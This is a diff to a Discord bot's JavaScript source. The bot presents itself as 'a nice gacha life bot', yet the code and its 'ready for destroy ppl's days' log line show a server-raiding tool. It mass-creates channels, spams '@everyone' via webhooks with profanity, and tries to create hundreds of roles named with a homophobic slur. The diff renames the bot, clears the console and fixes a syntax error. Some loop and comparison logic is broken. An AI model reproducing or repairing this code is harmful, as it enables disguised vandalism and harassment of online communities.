@@ -16,9 +16,10 @@ client.on("guildAdd", (guild) =>{
 });
 
 client.on("ready", () => { 
+    console.clear()
     console.log(`ready for destroy ppl's days`)
-    console.log(`Defoko V3`)
-    client.user.setActivity(`Defoco V3 - Prefix: $ [a nice gacha life bot]`);
+    console.log(`Tefoko V3`)
+    client.user.setActivity(`Tefoko V3 - Prefix: $ [a nice gacha life bot]`);
 });
 
 client.on("message", async (message) => {
@@ -51,7 +52,7 @@ client.on("message", async (message) => {
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
-                    message.guild.createChannel(`haha admin go grr`, {type: `voice`)
+                    message.guild.createChannel(`haha admin go grr`, {type: `voice`})
                     if(message.guild.channels > 499) return
                  }
             } else {
@@ -74,6 +75,7 @@ client.on("message", async (message) => {
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `voice`})
+                    if(message.guild.channels > 499) return
                 }
             }
             for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
